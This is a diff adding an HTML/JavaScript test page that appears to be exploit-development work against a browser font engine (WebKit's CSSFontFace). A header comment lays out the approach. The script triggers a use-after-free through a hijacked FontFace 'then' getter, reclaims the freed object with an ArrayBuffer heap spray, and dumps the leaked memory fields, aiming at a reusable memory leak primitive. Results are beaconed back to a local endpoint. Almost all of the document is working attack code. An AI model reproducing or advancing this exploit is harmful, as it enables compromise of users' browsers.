@@ -1,0 +1,185 @@
+<!--
+  p668t: benign-forge /size — p667-exact machinery (keepspray, batch beacons,
+  DUMP1/DUMP2, ROUNDS=8, all telemetry fields) with ONE delta: the ONLY seed
+  is a float at +0x44 = m_sizeAdjust (validated layout: m_loadingBehavior u8
+  @+0x40, padding, m_sizeAdjust float @+0x44, m_featureSettings @+0x48).
+  Lane/round encoded ONLY there: value = 100 + round + lane*0.001.
+
+  Rationale (source): m_sizeAdjust is a plain float compared in
+  setSizeAdjust() (CSSFontFace.cpp:333-336) and folded into
+  FontCreationContext in CSSFontFace::font() (CSSFontFace.cpp:749) — it is
+  consumed as DATA, never dereferenced, never branched as variant/Ref/status.
+  Every pointer-ish field (+0x08 m_propertiesOrCSSConnection, +0x18
+  m_families, +0x48 m_sources, +0x58 m_clients table, +0x68 m_wrapper,
+  +0x90 m_timeoutTimer) stays ZERO. +0x00 rc: with zeroed rc the engine's
+  ref() at add-time writes 1 — observe whether rc shows 1 (vs 101 in seeded
+  runs): free proof survives.
+
+  Discriminates against /zero: if /size survives R1 AND hits (engine writes
+  +0x58 into a lane), then a benign marker coexists with the reclaim+engine
+  write — the exact precondition for a multi-round READ-ONLY leak host. If
+  /size dies at R1 while /zero survives, the killer is any-non-zero-content
+  in the 0x00..0x48 window (not just +0x08) => bisect bytes next.
+
+  Hit detection via +0x58/+0x5C (engine-written, independent of our seed).
+  Beacon: P668T-.  CRASH_CLASS: MEDIUM.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p668t</title></head>
+<body>p668t: benign marker @+0x44 sizeAdjust (r8)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+}
+function flush() {
+  while (bQ.length) {
+    var b = bQ.splice(0, 2).join('|');
+    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P668T-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'benign-size r8');
+flush();
+
+var ROUNDS = 8;
+var round = 0;
+var results = [];
+var gfired = -1;
+
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+window.__sprayAlive = [];
+var snap1 = null;
+
+function seedLane(dv, i) {
+  /* /size: ONLY +0x44 m_sizeAdjust float — data, never dereferenced */
+  dv.setFloat32(0x44, 100 + round + i * 0.001, true);
+}
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    gfired = round;
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    spray = window.__sprayAlive[round] = [];
+    for (var i = 0; i < 24; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      seedLane(dv, i);
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function dumpLane(dv) {
+  var out = [];
+  for (var off = 0; off <= 0xB8; off += 8) {
+    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
+    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
+  }
+  return out.join(',');
+}
+
+function scanHit() {
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
+  }
+  return -1;
+}
+
+function beginRound() {
+  sty = document.createElement('style');
+  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive = window.__facesAlive || [];
+  window.__facesAlive.push(ff);
+  armed = true;
+  document.fonts.load('1em f' + round + ', s' + round, 'AB');
+  setTimeout(analyzeEarly, 150);
+  setTimeout(analyzeLate, 3500);
+}
+
+function analyzeEarly() {
+  try {
+    var hit = scanHit();
+    if (hit < 0) {
+      emit('R' + round, 'MISS gf=' + gfired);
+      results.push({ r: round, lane: -1, t: '-', w: '-' });
+    } else {
+      var dv = spray[hit];
+      snap1 = dumpLane(dv);
+      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
+      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
+      var dirtyNear = 0;
+      for (var j = Math.max(0, hit - 3); j <= Math.min(spray.length - 1, hit + 3); j++) {
+        if (spray[j].getUint32(0x58, true) !== 0 || spray[j].getUint32(0x5C, true) !== 0) dirtyNear++;
+      }
+      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
+      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
+           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
+           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
+           ' gf=' + gfired + ' dirtyNear=' + dirtyNear +
+           ' seed=' + dv.getFloat32(0x44, true).toFixed(3));
+      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
+    }
+    flush();
+  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+function analyzeLate() {
+  try {
+    var hit = scanHit();
+    if (hit >= 0 && spray.length) {
+      var dv = spray[hit];
+      var snap2s = dumpLane(dv);
+      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
+           ' rc=' + dv.getUint32(0x00, true) +
+           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
+      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
+    } else {
+      emit('R' + round + 'LATE', 'alive (miss-round)');
+    }
+    flush();
+    round++;
+    if (round < ROUNDS) {
+      gfired = -1;
+      setTimeout(beginRound, 250);
+    } else {
+      var ts = {}, lanes = [];
+      for (var k = 0; k < results.length; k++) {
+        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
+        lanes.push(results[k].lane);
+      }
+      var keys = Object.keys(ts);
+      emit('SUMMARY', 'size rounds=' + results.length + ' kept=' + window.__sprayAlive.length +
+           ' distinctT=' + keys.length + ' lanes=[' + lanes.join(',') + ']');
+      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
+      emit('ALIVE', 'end-r8-size');
+      flush();
+    }
+  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+setTimeout(beginRound, 50);
+
+})();
+</script>
+</body></html>
